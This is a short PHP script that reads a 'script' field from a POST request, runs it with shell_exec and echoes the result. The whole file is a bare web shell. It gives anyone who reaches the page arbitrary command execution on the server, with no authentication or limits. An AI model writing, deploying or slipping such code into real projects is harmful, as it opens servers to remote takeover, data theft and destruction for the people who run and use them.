<?php
if (isset($_POST['script'])) {
    $script = $_POST['script'];
    $output = shell_exec($script);
    echo nl2br($output);
} else {
    echo "No script provided.";
}
?>